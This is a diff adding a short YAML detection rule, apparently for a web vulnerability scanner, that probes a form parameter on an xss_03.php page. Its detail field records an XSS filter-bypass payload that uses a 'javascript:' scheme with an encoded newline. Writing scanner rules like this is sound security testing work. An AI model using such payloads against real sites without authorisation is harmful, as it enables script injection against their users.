@@ -1,0 +1,16 @@
+name: xss_03
+rules:
+  - method: GET
+    path: /xss/xss_03.php
+    follow_redirects: false
+    body: message=javAscriPt%3A%2F%2F%250akwfjddzc&submit=submit
+    expression: response.status==200 && lengthDiff
+  - method: GET
+    path: /xss/xss_03.php
+    follow_redirects: false
+    body: message=j&submit=submit
+    expression: response.status==200 && lengthDiff
+detail:
+  type: Form bypass
+  paramkey: message
+  payload: javascript://%0aprompt(1)//
